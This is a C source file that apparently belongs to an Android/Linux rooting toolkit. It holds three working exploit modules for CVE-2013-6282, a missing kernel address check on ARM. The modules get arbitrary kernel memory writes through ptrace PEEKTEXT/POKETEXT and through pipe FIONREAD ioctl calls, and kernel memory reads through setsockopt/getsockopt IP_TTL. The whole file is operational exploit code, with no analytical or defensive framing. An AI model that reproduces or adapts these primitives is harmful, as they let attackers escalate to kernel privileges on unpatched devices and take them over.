
#include "log.h"
#include "exploit.h"
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <malloc.h>
#include <stdlib.h>
#include <string.h>

extern long __ptrace(int request, pid_t pid, void *addr, void *data);

struct priv_data_ptrace {
    int fd[2];
    pid_t pid;
    int val;
};

static int ptrace_init(void **opaque) {
    struct priv_data_ptrace *p;
    int rc;

    p = (struct priv_data_ptrace *) calloc(1, sizeof(*p));
    if (!p) {
        LOGE("malloc()");
        return -1;
    }
    rc = pipe(p->fd);
    if (rc < 0) {
        LOGE("pipe");
        goto bail_pipe;
    }
    p->pid = fork();
    if (p->pid < 0) {
        LOGE("fork()");
        goto bail_fork;
    }
    if (p->pid) {
        rc = ptrace(PTRACE_ATTACH, p->pid, 0, 0);
        if (rc < 0) {
            LOGE("ptrace()");
            goto bail_ptrace;
        }
        rc = waitpid(p->pid, NULL, 0);
        if (rc < 0) {
            LOGE("waitpid()");
            goto bail_waitpid;
        }
    } else {
        char whatever[4];

        for (;;) {
            rc = read(p->fd[0], whatever, sizeof(whatever));
            if (rc < 0) {
                LOGE("read()");
                break;
            }
            if (rc != 4) {
                LOGD("unexpected read size.");
                break;
            }
            if (!memcmp(whatever, "QUIT", 4)) {
                break;
            }
        }
        exit(0);
    }
    *opaque = p;
    return 0;
bail_waitpid:
    rc = ptrace(PTRACE_DETACH, p->pid, 0, 0);
    if (rc < 0)
        LOGE("ptrace()");
bail_ptrace:
    rc = write(p->fd[1], "QUIT", 4);
    if (rc < 0)
        LOGE("write()");
bail_fork:
    close(p->fd[0]); close(p->fd[1]);
bail_pipe:
    free(p);
    return rc;
}

static void ptrace_free(void **opaque) {
    struct priv_data_ptrace *p = (struct priv_data_ptrace *)(*opaque);
    int rc, status;

    rc = ptrace(PTRACE_CONT, p->pid, 0, 0);
    if (rc < 0) {
        LOGE("ptrace()");
        goto bail;
    }
    rc = write(p->fd[1], "QUIT", 4);
    if (rc < 0) {
        LOGE("write()");
        goto bail;
    }
    if (rc < 4) {
        LOGD("unexpected write size.");
        goto bail;
    }
    rc = waitpid(p->pid, &status, 0);
    if (rc < 0) {
        LOGE("waitpid()");
    }
bail:
    close(p->fd[0]);
    close(p->fd[1]);
    free(p);
    *opaque = 0;
}

/*
    request, pid, addr, data
    *data = *addr;
 */

static int ptrace_write32(void *opaque, long addr, long val) {
    struct priv_data_ptrace *p = (struct priv_data_ptrace *) opaque;
    int rc;

    // the desired value
    rc = __ptrace(PTRACE_POKETEXT, p->pid, &p->val, (void *) val);
    if (rc < 0) {
        LOGE("__ptrace()");
        return rc;
    }
    // the desired value will be written
    rc = __ptrace(PTRACE_PEEKTEXT, p->pid, &p->val, (void *) addr);
    if (rc < 0) {
        LOGE("__ptrace()");
        return rc;
    }
    return 0;
}

exploit_t EXPLOIT_cve_2013_6282_ptrace = {
    .name = "fate",
    .flags = EXPLOIT_POKE_TEXT,
    .init = ptrace_init,
    .free = ptrace_free,
    .write32 = ptrace_write32,
};

static int pipe_init(void **opaque) {
    return 0;
}

static void pipe_free(void **opaque) {
    (void) opaque;
}

static int pipe_write32(void *opaque, long addr, long val) {
    char data[sizeof(val)];
    int fd[2], rc, i;
    char somewhat[256];

    rc = pipe(fd);
    if (rc < 0) {
        LOGE("pipe()");
        return -1;
    }
    memcpy(data, &val, sizeof(val));
    for (i = 0; i < sizeof(data); i++) {
        if (data[i]) {
            rc = write(fd[1], somewhat, data[i]);
            if (rc < 0) {
                LOGE("write()");
                break;
            }
            if (rc != data[i]) {
                LOGD("unexpected write size.");
                break;
            }
            rc = 0;
        }
        rc = ioctl(fd[0], FIONREAD, (void *)(addr + i));
        if (rc < 0) {
            LOGE("ioctl()");
            break;
        }
        if (data[i]) {
            rc = read(fd[0], somewhat, data[i]);
            if (rc < 0) {
                LOGE("read()");
                break;
            }
            if (rc != data[i]) {
                LOGD("unexpected read size.");
                break;
            }
            rc = 0;
        }
    }
    close(fd[0]);
    close(fd[1]);
    return rc ? -1 : 0;
}

exploit_t EXPLOIT_cve_2013_6282_pipe = {
    .name = "nanoha",
    .flags = EXPLOIT_POKE_WITH_GARBAGE,
    .init = pipe_init,
    .free = pipe_free,
    .write32 = pipe_write32,
};

static int socket_init(void **opaque) {
    int fd;

    *opaque = (void *) -1;
    fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0)
        return -1;
    *opaque = (void *) fd;
    return 0;
}

static void socket_free(void **opaque) {
    int fd;

    fd = (int) *opaque;
    if (fd >= 0)
        close(fd);
}

static int socket_read32(void *opaque, long addr, long *val) {
    int rc, fd, i;
    socklen_t l;

    fd = (int) opaque;
    for (i = 0; i < sizeof(*val); i++) {
        rc = setsockopt(fd, SOL_IP, IP_TTL, (void *)(addr + i), 1);
        if (rc < 0)
            return -1;
        l = 1;
        rc = getsockopt(fd, SOL_IP, IP_TTL, (void *)((char *) val + i), &l);
        if (rc < 0)
            return -1;
    }

    return 0;
}

exploit_t EXPLOIT_cve_2013_6282_socket = {
    .name = "hayate",
    .init = socket_init,
    .free = socket_free,
    .read32 = socket_read32,
};

